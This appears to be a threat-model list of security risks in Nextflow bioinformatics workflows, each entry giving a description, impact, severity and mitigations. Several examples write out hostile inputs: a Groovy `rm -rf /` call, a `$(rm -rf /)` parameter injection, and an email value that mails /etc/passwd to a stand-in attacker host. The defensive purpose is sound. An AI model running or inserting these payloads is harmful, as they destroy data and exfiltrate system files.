*   **Malicious Workflow Definition (DSL2/Groovy)**
    *   **Description:** An attacker injects or modifies the Nextflow workflow definition to execute arbitrary code.
    *   **How Nextflow Contributes:** Nextflow's reliance on a Groovy-based DSL for workflow definition allows for the execution of arbitrary Groovy code if the definition is compromised.
    *   **Example:** An attacker modifies a workflow to include a process that executes `System.getRuntime().exec("rm -rf /")` when the workflow is run.
    *   **Impact:** Complete compromise of the execution environment, data loss, and potential lateral movement.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Implement strict access controls on workflow definition files.
        *   Perform code reviews of workflow definitions, especially those sourced from untrusted locations.
        *   Use static analysis tools to scan workflow definitions for potential vulnerabilities.
        *   Consider sandboxing or containerizing the Nextflow execution environment itself.
        *   Validate and sanitize any user input that influences the workflow definition.

*   **Insecure Process Definitions (Command Injection)**
    *   **Description:**  Process commands within the workflow are constructed using unsanitized user input or data from untrusted sources, allowing attackers to inject malicious commands.
    *   **How Nextflow Contributes:** Nextflow's process definitions often involve constructing shell commands dynamically based on variables and channel data. If this construction is not done securely, it can lead to command injection.
    *   **Example:** A process definition uses a variable `$params.output_dir` without sanitization in a command like `mkdir -p $params.output_dir`. An attacker could set `params.output_dir` to `$(rm -rf /)` leading to arbitrary command execution.
    *   **Impact:** Arbitrary command execution on the system where the process is running, potentially leading to data breaches, system compromise, or denial of service.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Always sanitize and validate user inputs and data from external sources before using them in process commands.
        *   Avoid constructing shell commands dynamically whenever possible.
        *   Use parameterized commands or safer alternatives to shell execution where feasible.
        *   Enforce the principle of least privilege for processes.

*   **Use of Insecure Container Images in Processes**
    *   **Description:** Nextflow processes rely on container images that contain known vulnerabilities.
    *   **How Nextflow Contributes:** Nextflow facilitates the use of container technologies like Docker and Singularity for process execution. If developers use outdated or vulnerable base images, those vulnerabilities become part of the application's attack surface.
    *   **Example:** A Nextflow process uses a Docker image with a known vulnerability in its operating system libraries, which an attacker could exploit to gain access to the container.
    *   **Impact:** Compromise of the container environment, potentially leading to data breaches, privilege escalation within the container, or denial of service.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Regularly scan container images for vulnerabilities using tools like Clair, Trivy, or Anchore.
        *   Use minimal and trusted base images.
        *   Keep container images up-to-date with the latest security patches.
        *   Implement a process for managing and approving container images used in workflows.

*   **Insecure Handling of Workflow Parameters**
    *   **Description:** Workflow parameters, which influence process execution, are not properly validated and sanitized, allowing attackers to inject malicious values.
    *   **How Nextflow Contributes:** Nextflow allows users to provide parameters that directly influence workflow execution. If these parameters are not treated as potential attack vectors, they can be exploited.
    *   **Example:** A workflow takes a parameter `--email` which is used in a notification script without validation. An attacker could provide a malicious email address like `"attacker@example.com; mail -s 'You are hacked' attacker@evil.com < /etc/passwd"` to exfiltrate sensitive data.
    *   **Impact:**  Information disclosure, arbitrary command execution (depending on how the parameter is used), or disruption of workflow execution.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Implement strict validation and sanitization of all workflow parameters.
        *   Define expected data types and formats for parameters.
        *   Use allow-lists instead of deny-lists for parameter validation.
        *   Avoid directly using unsanitized parameters in shell commands or sensitive operations.

*   **Insecure File System Access within Processes**
    *   **Description:** Processes are granted excessive file system permissions or manipulate file paths insecurely, leading to unauthorized access or modification of files.
    *   **How Nextflow Contributes:** Nextflow processes often interact with the file system to read input and write output. If not carefully managed, this can create opportunities for attackers.
    *   **Example:** A process uses a user-provided file path without proper validation, allowing an attacker to specify a path like `/etc/shadow` for reading or overwriting.
    *   **Impact:** Data breaches, modification or deletion of critical files, and potential system compromise.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Adhere to the principle of least privilege when granting file system access to processes.
        *   Avoid constructing file paths dynamically based on user input without thorough sanitization.
        *   Use secure file handling practices within process scripts.
        *   Consider using temporary directories with restricted permissions for process execution.

*   **Exposure of Sensitive Data in Channels or Work Directories**
    *   **Description:** Sensitive data flowing through Nextflow channels or stored in work directories is not adequately protected, leading to potential information disclosure.
    *   **How Nextflow Contributes:** Nextflow manages data flow through channels and stores intermediate results in work directories. If these are not secured, sensitive data can be exposed.
    *   **Example:** A workflow processes sensitive patient data, and this data is temporarily stored in plain text in the Nextflow work directory with insufficient access controls.
    *   **Impact:** Confidentiality breach, regulatory non-compliance, and reputational damage.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Encrypt sensitive data at rest and in transit within the workflow.
        *   Implement appropriate access controls on Nextflow work directories.
        *   Consider using secure storage solutions for sensitive intermediate data.
        *   Redact or mask sensitive data in logs and debugging output.

*   **Insecure Integration with External Services**
    *   **Description:** Workflows interact with external services (APIs, databases) insecurely, leading to vulnerabilities like credential exposure or injection attacks.
    *   **How Nextflow Contributes:** Nextflow workflows often need to interact with external systems to retrieve data or perform actions. If these integrations are not secured, they can be exploited.
    *   **Example:** A workflow stores database credentials directly in the workflow definition or configuration file, making them accessible to anyone with access to those files.
    *   **Impact:** Unauthorized access to external systems, data breaches, and potential manipulation of external resources.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Avoid hardcoding credentials in workflow definitions or configuration files.
        *   Use secure credential management solutions (e.g., HashiCorp Vault, environment variables).
        *   Implement proper authentication and authorization when interacting with external APIs.
        *   Sanitize data before sending it to external systems to prevent injection attacks.
